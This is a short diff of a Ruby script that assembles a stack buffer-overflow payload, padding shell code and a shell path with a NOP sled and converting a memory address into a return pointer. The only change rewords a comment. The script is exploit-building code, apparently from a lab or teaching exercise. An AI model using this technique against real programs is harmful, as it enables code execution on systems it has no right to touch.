@@ -35,7 +35,7 @@ puts "Payload size is #{attack.count} bytes.\n"
 (1000 - shell_path.length - shell_code.length).times { attack << 90 } # NOP fill the rest of the array
 (32).times { attack << 90 } # NOP fill ABI artefacts on the stack
 
-# Replacing payload pointer
+# Payload pointer
 (array_in_memory + shell_path.length).
 to_s(16). # Turn to hexadecimal string
 chars. # Turn to characters
